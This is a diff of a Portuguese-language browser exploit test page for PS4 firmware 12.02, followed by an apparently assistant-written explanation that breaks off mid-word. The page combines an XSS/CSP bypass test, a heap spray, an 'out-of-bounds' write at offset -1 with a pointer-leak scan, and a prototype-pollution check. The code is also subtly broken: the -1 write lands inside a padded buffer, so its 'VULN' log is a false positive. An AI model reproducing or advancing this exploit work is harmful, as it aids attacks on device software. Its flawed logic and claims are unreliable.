@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 FW 12.02 - Teste v16 (Info Leak c/ Spray)</title>
+    <title>PS4 FW 12.02 - Teste v17 (Info Leak Granular @ -1)</title>
     <style>
         /* Estilos CSS */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
@@ -14,14 +14,14 @@
         .log-good { color: #4CAF50; }
         .log-warn { color: #FFC107; }
         .log-error { color: #f44336; }
-        .log-leak { color: #FF9800; font-weight: bold; }
-        .log-ptr { color: #f0f; font-weight: bold; }
+        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks genéricos */
+        .log-ptr { color: #f0f; font-weight: bold; } /* Magenta para POTENCIAIS ponteiros */
         #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }
     </style>
 </head>
 <body>
-    <h1>PS4 FW 12.02 - Teste v16 (Info Leak c/ Spray)</h1>
-    <p>Testa: XSS, OOB R/W (Info Leak c/ Object Spray), PP Básica.</p>
+    <h1>PS4 FW 12.02 - Teste v17 (Info Leak Granular @ -1)</h1>
+    <p>Testa: XSS, OOB R/W (Escrita @ -1 + Leitura Granular), PP Básica.</p>
     <button id="runBtn" onclick="runAllTests()">Iniciar Todos os Testes</button>
     <div id="output"></div>
     <div id="xss-target-div">Área para teste de XSS DOM.</div>
@@ -32,7 +32,8 @@
         const runBtn = document.getElementById('runBtn');
         const SHORT_PAUSE = 50; // ms
         const MEDIUM_PAUSE = 500; // ms
-        const SPRAY_COUNT = 50; // Number of victim objects to spray
+        const SPRAY_COUNT = 50; // Número de objetos para o spray
+        const READ_RANGE = 64; // Quantos bytes ler antes/depois do buffer
 
         // --- Função de Log ---
         const log = (message, type = 'info') => {
@@ -71,13 +72,14 @@
          // --- Heurística Simples para Detetar Potenciais Dados U32 ---
          const isPotentialData32 = (val) => {
              if (val === null || typeof val !== 'number') return false;
-             val = val >>> 0; // Trata como Uint32
+             val = val >>> 0;
              if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false;
-             if (val < 0x1000) return false; // Filtra valores muito pequenos
+             if (val < 0x1000) return false;
              return true;
          }
 
         // --- Teste 1: CSP Bypass / XSS ---
+        // (Função testCSPBypass igual à versão anterior)
         const testCSPBypass = async () => {
             log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
             // ... (código igual ao script v10) ...
@@ -119,112 +121,80 @@
             log("--- Teste 1 Concluído (Verificar alertas/DOM) ---", 'test');
         };
 
-        // --- Teste 2: OOB Write/Read com Object Spray (Info Leak) ---
-        // NOVO: Tenta alocar diferentes tipos de objetos antes do teste OOB
-        const testOOBReadInfoLeakWithSpray = async () => {
-            log("--- Iniciando Teste 2: OOB Write/Read com Object Spray (Info Leak) ---", 'test');
+
+        // --- Teste 2: OOB Write/Read Granular com Spray (Info Leak @ -1) ---
+        // Modificado para fazer a escrita OOB inicial no offset -1
+        const testOOBReadGranularLeakNeg1 = async () => {
+            log("--- Iniciando Teste 2: OOB Write/Read Granular (Escrita @ -1) ---", 'test');
             const bufferSize = 32;
             const writeValue = 0xEE;
-            const oobWriteOffset = 32; // Offset OOB confirmado
-            const oobReadOffsets = [];
-            for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); }
+            const oobWriteOffset = -1; // <<< MUDANÇA AQUI: Tenta escrever antes do buffer
+            const readStartOffset = -READ_RANGE;
+            const readEndOffset = bufferSize + READ_RANGE;
+            let writeSuccess = false;
+            let potentialLeakFoundCount = 0;
 
-            // Tipos de objetos para "spray"
-            const victimFactories = {
-                "String": () => "S".repeat(128), // String longa
-                "Float64Array": () => new Float64Array(32),
-                "Int32Array": () => new Int32Array(32),
-                "Array": () => [1.1, 2.2, {}, "test"], // Array misto
-                "Object": () => ({ a: 1, b: "test", c: null }), // Objeto simples
-                // "HTMLElement": () => document.createElement('div') // DOM pode ser mais complexo/lento
-            };
+            try {
+                // 1. Object Spray
+                log(`Fazendo spray de ${SPRAY_COUNT} objetos HTMLElement (div)...`, 'subtest');
+                const sprayArray = [];
+                for (let i = 0; i < SPRAY_COUNT; i++) {
+                    const div = document.createElement('div');
+                    div.textContent = `SprayDiv_${i}`;
+                    sprayArray.push(div);
+                }
+                log("Spray concluído.", 'info');
+                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
 
-            let totalLeaksFound = 0;
+                // 2. Alocação e Escrita OOB
+                const buffer = new ArrayBuffer(bufferSize + 2 * READ_RANGE + 16);
+                const dataView = new DataView(buffer);
+                const baseOffset = READ_RANGE + 8;
+                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
 
-            // Loop através dos tipos de vítimas
-            for (const victimName in victimFactories) {
-                log(`--- Tentando Info Leak perto de ${victimName} ---`, 'subtest');
-                let sprayObjects = []; // Guarda os objetos do spray
-                let attackerBuffer = null;
-                let dataView = null;
-                let writeSuccess = false;
-                let potentialLeakFoundInAttempt = 0;
-
+                const writeTargetAddress = baseOffset + oobWriteOffset; // Endereço alvo da escrita
+                log(`Tentando escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress})...`, 'subtest');
+                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
                 try {
-                    // 1. Spray de Objetos Vítima (simplificado)
-                    log(`  Fazendo spray de ${SPRAY_COUNT} objetos ${victimName}...`, 'info');
-                    for (let i = 0; i < SPRAY_COUNT; i++) {
-                        sprayObjects.push(victimFactories[victimName]());
-                    }
-                    log(`  Spray concluído.`, 'info');
-                    await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); // Pausa pós-spray
-
-                    // 2. Aloca o buffer atacante (esperança: perto de um dos objetos do spray)
-                    attackerBuffer = new ArrayBuffer(bufferSize + 256); // Buffer maior
-                    dataView = new DataView(attackerBuffer);
-                    const baseOffset = 128;
-                    for (let i = 0; i < attackerBuffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } // Preenche com padrão
-
-                    // 3. Realiza a escrita OOB
-                    const writeTargetAddress = baseOffset + oobWriteOffset;
-                    log(`  Tentando escrita OOB U8 @${oobWriteOffset}...`, 'info');
-                    await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                    try {
-                        dataView.setUint8(writeTargetAddress, writeValue);
-                        log(`  VULN: Escrita OOB permitida!`, 'vuln');
-                        writeSuccess = true;
-                    } catch (e) {
-                        log(`  BLOQUEADO: Escrita OOB impedida: ${e.message}`, 'good');
-                        continue; // Pula para o próximo tipo de vítima se a escrita falhar
-                    }
-
-                    await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-
-                    // 4. Loop de Leitura OOB Extensivo
-                    log(`  Tentando leituras OOB U32/U64 em ${oobReadOffsets.length} offsets...`, 'info');
-                    for (const readOffset of oobReadOffsets) {
-                        const readTargetAddress = baseOffset + readOffset;
-                        if (readTargetAddress < 0 || readTargetAddress + 8 > attackerBuffer.byteLength) continue;
-
-                        try {
-                            const low = dataView.getUint32(readTargetAddress, true);
-                            const high = dataView.getUint32(readTargetAddress + 4, true);
-                            if (isPotentialPointer64(high, low)) {
-                                const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`;
-                                log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr');
-                                potentialLeakFoundInAttempt++;
-                            } else {
-                                const val32 = low;
-                                if (isPotentialData32(val32)) {
-                                    log(`  -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak');
-                                    potentialLeakFoundInAttempt++;
-                                }
-                            }
-                        } catch (e) {/* Ignora */}
-                        if (readOffset % 64 === 0) await new Promise(resolve => setTimeout(resolve, 1));
-                    } // Fim loop leitura OOB
-
-                } catch (e) { log(`  Erro inesperado durante teste com ${victimName}: ${e.message}`, 'error'); }
-                finally {
-                    // Limpa referências para ajudar GC
-                    sprayObjects = null;
-                    attackerBuffer = null;
-                    dataView = null;
-                    // Forçar GC não é possível, mas esperamos que limpar refs ajude
-                    await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); // Pausa entre tipos de vítima
+                    dataView.setUint8(writeTargetAddress, writeValue);
+                    log(`VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln');
+                    writeSuccess = true;
+                } catch (e) {
+                    log(`BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'good');
+                    log("--- Teste 2 Interrompido (Escrita OOB falhou) ---", 'test');
+                    return false;
                 }
 
-                log(`--- Fim da tentativa com ${victimName}: ${potentialLeakFoundInAttempt} potenciais leaks encontrados. ---`, 'subtest');
-                totalLeaksFound += potentialLeakFoundInAttempt;
+                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
 
-            } // Fim loop tipos de vítima
+                // 3. Loop de Leitura OOB Granular
+                log(`Tentando leituras OOB U64 GRANULAR (1 byte step) de offset ${readStartOffset} a ${readEndOffset}...`, 'subtest');
+                log(`AVISO: Este scan pode ser LENTO!`, 'warn');
 
-            log(`--- Teste 2 Concluído (Total de ${totalLeaksFound} potenciais leaks encontrados com spray) ---`, 'test');
-            return totalLeaksFound > 0;
+                for (let readOffset = readStartOffset; readOffset <= readEndOffset; readOffset++) {
+                    const readTargetAddress = baseOffset + readOffset;
+                    if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue;
+
+                    try {
+                        const low = dataView.getUint32(readTargetAddress, true);
+                        const high = dataView.getUint32(readTargetAddress + 4, true);
+                        if (isPotentialPointer64(high, low)) {
+                            const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`;
+                            log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr');
+                            potentialLeakFoundCount++;
+                        }
+                    } catch (e) {/* Ignora */}
+                    if (readOffset % 16 === 0) await new Promise(resolve => setTimeout(resolve, 1));
+                } // Fim loop leitura OOB
+
+            } catch (e) { log(`Erro inesperado durante o teste Info Leak Granular: ${e.message}`, 'error'); }
+
+            log(`--- Teste 2 Concluído (${potentialLeakFoundCount} potenciais ponteiros encontrados no scan granular após escrita @ -1) ---`, 'test');
+            return potentialLeakFoundCount > 0;
         };
 
-
         // --- Teste 3: Prototype Pollution (Básica) ---
+        // (Função testBasicPP igual à versão anterior)
         const testBasicPP = async () => {
             log("--- Iniciando Teste 3: Prototype Pollution (Básica) ---", 'test');
             // ... (código igual ao script v10) ...
@@ -255,20 +225,18 @@
         // --- Função Principal para Rodar Todos os Testes ---
         const runAllTests = async () => {
             if (runBtn) runBtn.disabled = true;
-            log("==== INICIANDO TODOS OS TESTES COMBINADOS v16 (Info Leak c/ Spray) ====", 'critical');
+            log("==== INICIANDO TODOS OS TESTES COMBINADOS v17 (Info Leak Granular @ -1) ====", 'critical');
 
             await testCSPBypass(); // Teste 1
             await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
 
-            await testOOBReadInfoLeakWithSpray(); // Teste 2 (NOVO - com spray)
+            await testOOBReadGranularLeakNeg1(); // Teste 2 (NOVO - Escrita @ -1)
             await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
 
             await testBasicPP(); // Teste 3
             await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
 
-            // Removidos outros testes para focar no Info Leak com spray
-
-            log("\n==== TODOS OS TESTES COMBINADOS v16 CONCLUÍDOS ====", 'critical');
+            log("\n==== TODOS OS TESTES COMBINADOS v17 CONCLUÍDOS ====", 'critical');
             if (runBtn) runBtn.disabled = false;
         };
 
@@ -277,3 +245,12 @@
 
 </body>
 </html>
+```
+
+**O que esperar:**
+
+* O Teste 2 agora tentará escrever no offset `-1`. Sabemos que a escrita aqui foi permitida em testes anteriores.
+* Depois, fará o mesmo scan granular (byte a byte) lendo valores de 64 bits numa área alargada.
+* **Observe atentamente o log do Teste 2:** A esperança é que escrever em `-1` (antes do buffer) possa corromper metadados ou dados de um objeto *anterior* na memória, e que a leitura OOB subsequente consiga apanhar um ponteiro ou dados internos desse objeto corrompido. Procure por mensagens `POTENCIAL PONTEIRO?` (magenta).
+
+Esta é mais uma tentativa de variar as condições do teste OOB Read/Write para maximizar as hipóteses de encontrar um leak significati
